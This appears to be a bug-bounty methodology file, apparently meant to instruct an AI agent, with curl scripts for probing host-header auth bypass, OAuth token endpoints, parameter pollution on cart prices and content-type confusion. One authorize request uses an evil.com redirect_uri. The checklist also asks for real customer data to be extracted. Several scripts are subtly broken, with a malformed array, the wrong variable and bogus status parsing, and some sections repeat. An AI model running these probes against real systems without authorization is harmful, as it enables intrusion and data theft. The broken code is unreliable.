# Real Impact Verification Methodology (adam kues Style)

## Philosophy
**"Token leak beneran leak ga? Klo ga beneran buat apa? Cek soul.md mu, kalau ga berdampak cuka asumsi buat apa."**
- Only report VERIFIED impact with tool output
- If you can't prove token leak with actual token found, DROP the finding
- No "may expose", "could leak", "potential for"
- Real tool output only: `curl` → token string in response. If empty → finding deleted.

## Core Principle: Prove Real Impact Before Reporting

### The adam kues Standard
> "Don't report until you prove real impact. Like adam kues does with WordPress - he finds the weakness, proves real exploitation, THEN reports."

### The Golden Rule
> **If you can't demonstrate actual exploitation with tool output, you don't have a finding.**

## Verification Checklist (MUST Pass All)

### For Authentication Bypass
- [ ] **Actual admin panel access**: Response contains admin keywords (admin, dashboard, panel, manage, settings, role, permission)
- [ ] **Multiple independent vectors**: At least 2 independent bypass methods
- [ ] **Reproducible**: Same result every time
- [ ] **Not theoretical**: Actual response content differs from normal

### For Token/Secret Leakage
- [ ] **Actual token in response**: `access_token`, `refresh_token`, `Bearer` token visible
- [ ] **Token works**: Can use token to access protected endpoints
- [ ] **Not just error page**: Response is NOT a login/error page
- [ ] **Token validates**: Token can be decoded/verified

### For Logic Bypass (Parameter Pollution, etc.)
- [ ] **Real error leak**: Response contains actual error messages (not generic)
- [ ] **Logic change visible**: Different response length, different items, price changes
- [ ] **Reproducible**: Same payload → same result every time
- [ ] **Not just "accepted"**: Actual behavior change, not just 200 OK

### For OAuth/SAML Endpoints
- [ ] **Actual token returned**: `access_token` in JSON response
- [ ] **Token works**: Can use token to access protected resources
- [ ] **Not login page**: Response is NOT a login/error page
- [ ] **Multiple grant types**: At least 2 grant types work

### For Next.js RSC Admin Bypass
- [ ] **RSC auth gate check**: `5:I[...` (component rendered) NOT `5:E{...NEXT_REDIRECT...}` (redirect)
- [ ] **Admin data in HTML**: Dashboard stats (users, revenue, orders) present in SSR body
- [ ] **Session valid**: `/api/auth/session` returns user object, not `null`
- [ ] **Multiple pages confirmed**: `/admin`, `/admin/orders`, `/admin/users` all return admin layout (not redirect)
- [ ] **Customer data extractable**: Real emails/order IDs in response, not placeholder/empty tables

### For Parameter Pollution
- [ ] **Error leak**: Response contains internal error messages (stack traces, SQL errors, null pointer exceptions)
- [ ] **Logic change**: Different response length, different items, price changes
- [ ] **Reproducible**: Same payload → same result every time

### For Content-Type Confusion
- [ ] **All types return 200**: Not just 415/400/415
- [ ] **Parser differential**: Different content types return different responses
- [ ] **WAF bypass**: Malicious payloads bypass WAF when sent with different Content-Type

### For OAuth/SAML Endpoints
- [ ] **Token endpoint returns 200**: Not 401/403
- [ ] **Multiple grant types work**: client_credentials, password, authorization_code
- [ ] **Authorization endpoint accessible**: Returns authorization page (not 401/403)

## Verification Scripts

### Host Header Auth Bypass Verification
```bash
#!/bin/bash
TARGET="https://target.com"

echo "=== Host Header Auth Bypass Verification ==="

# Normal request
r_normal=$(curl -s "$TARGET")

# Bypass attempts
headers=(
#  "X-Forwarded-For: 127.0.0.1"
#  "X-Original-URL: /admin"
#  "X-Rewrite-URL: /admin"
#  "X-Envoy-Original-Path: /admin"
#  "X-Forwarded-Path: /admin"
#)

# Test each header
for hdr in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin"; do
  r=$(curl -s -H "$hdr" "$TARGET")
  if echo "$r" | grep -qi "admin\|dashboard\|panel\|manage\|settings\|role\|permission"; then
    echo "[+] VULNERABLE: $1 - Admin keywords found!"
    exit 0
  fi
done

echo "[-] Not vulnerable - no admin content in any bypass"
exit 1
```

### Token Endpoint Verification
```bash
#!/bin/bash
TARGET="https://target.com/tw/services/auth/token"

echo "=== Token Endpoint Verification ==="

# Test all grant types
grants=("client_credentials" "password" "authorization_code" "refresh_token")

for grant in "${grants[@]}"; do
  r=$(curl -s -X POST "https://target.com/tw/services/auth/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=$grant&client_id=test&client_secret=test")
  
  if echo "$r" | grep -q '"access_token"'; then
    echo "[+] TOKEN RETURNED for grant_type=$grant"
    echo "    Token: $(echo "$r" | grep -o '"access_token":"[^"]*"' | head -1)"
    exit 0
  elif echo "$r" | grep -qi "login\|problem logging in"; then
    echo "[-] Returns login page for $grant (not vulnerable)"
  fi
done

echo "[-] No tokens returned for any grant type"
exit 1
```

### Parameter Pollution Verification
```bash
#!/bin/bash
TARGET="https://target.com/cart"

echo "=== Parameter Pollution Verification ==="

test_cases=(
  "?price=100&price=0"
  "?quantity=1&quantity=999"
  "?discount=10&discount=100"
  "?coupon=SAVE10&coupon=SAVE100"
  "?product_id=1&product_id=2"
)

for params in "${test_cases[@]}"; do
  r=$(curl -s "$TARGET$params")
  if echo "$r" | grep -qi "error\|exception\|null\|undefined\|exception"; then
    echo "[+] ERROR LEAK: $params"
    echo "    Response: $(echo "$r" | grep -i "error\|exception\|null" | head -1)"
  fi
done
```

### Content-Type Confusion Verification
```bash
#!/bin/bash
TARGET="https://api.target.com"

echo "=== Content-Type Confusion Verification ==="

content_types=(
  "application/json"
  "application/x-www-form-urlencoded"
  "multipart/form-data"
  "text/xml"
  "text/plain"
  "application/octet-stream"
)

vulnerable=0
for ct in "${content_types[@]}"; do
  r=$(curl -s -X POST -H "Content-Type: $ct" -d '{"test":"value"}' "https://target/api/endpoint")
  if [ "$(echo "$r" | head -1 | awk '{print $2}')" = "200" ]; then
    echo "[+] $ct: 200 OK"
    vulnerable=$((vulnerable + 1))
  else
    echo "[-] $ct: $(echo "$r" | head -1 | awk '{print $2}')"
  fi
done

if [ $vulnerable -ge 4 ]; then
  echo "[+] VULNERABLE: $vulnerable/6 content types accepted"
else
  echo "[-] Not vulnerable: $vulnerable/6 content types accepted"
fi
```

### OAuth/SAML Endpoint Verification
```bash
#!/bin/bash
TARGET="https://target.com"

echo "=== OAuth/SAML Endpoint Verification ==="

# Test all grant types
grants=("client_credentials" "password" "authorization_code" "refresh_token")
for grant in "${grants[@]}"; do
  r=$(curl -s -X POST "https://target.com/tw/services/auth/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=$grant&client_id=test&client_secret=test")
  
  if [ "$(echo "$r" | head -1 | awk '{print $2}')" = "200" ]; then
    if echo "$r" | grep -q '"access_token"'; then
      echo "[+] REAL TOKEN for $grant"
    else
      echo "[?] 200 OK for $grant but no token (login page?)"
    fi
  fi
done

# Test authorization endpoint
r=$(curl -s "https://target.com/tw/services/auth/authorize?response_type=code&client_id=test&redirect_uri=https://evil.com/callback")
if echo "$r" | grep -qi "login\|authorize\|approve"; then
  echo "[+] Authorization endpoint accessible (200 OK with login form)"
fi
```

## Real Impact Verification Report Template

### Finding: [Title]
**Status**: VERIFIED / THEORETICAL / DROPPED

### Verification Evidence
```
Command: curl -H "X-Forwarded-For: 127.0.0.1" https://target/
Output: <html>...admin dashboard panel management settings role permission...</html>
Status: 200 OK
Admin keywords found: admin, dashboard, panel, manage, settings, role, permission
```

### Verification Checklist
- [ ] **Multiple independent vectors**: At least 2 independent bypass methods
- [ ] **Reproducible**: Same result 5/5 times
- [ ] **Not theoretical**: Actual tool output shows impact
- [ ] **Not login page**: Response is NOT a login/error page
- [ ] **Actual behavior change**: Not just 200 OK, actual content change

### If ANY Check Fails → DROP THE FINDING

## Decision Matrix

| Finding Type | Verification Required | If Fails |
|--------------|----------------------|----------|
| Auth Bypass | Multiple headers work + admin content | DROP |
| Token Leak | Actual token in response + works | DROP |
| Logic Bypass | Error leak + behavior change | DROP |
| Content-Type | 4+ types return 200 + differential | DROP |
| OAuth/SAML | 2+ grant types work + authorize works | DROP |

## Anti-Patterns (DROP Immediately)
- "Potential for token leak"
- "May expose admin panel"
- "Could allow parameter pollution"
- "Theoretically vulnerable to"
- "May allow bypass"
- "Potential XXE"
- "Could lead to RCE"
- No actual tool output showing impact
- Response is login page / error page
- Only 200 OK with no behavior change

## Final Decision Checklist

Before submitting ANY finding:
- [ ] Ran actual curl/command that shows impact
- [ ] Output contains concrete evidence (token, admin keywords, error leak, etc.)
- [ ] At least 2 independent vectors confirm the issue
- [ ] Not a login page / error page / generic response
- [ ] Can reproduce 5/5 times
- [ ] Would stake reputation on this being real

**If ANY unchecked → DO NOT REPORT**

---

*"Token leak beneran leak ga? Klo ga beneran buat apa? Cek soul.md mu, kalau ga berdampak cuka asumsi buat apa."*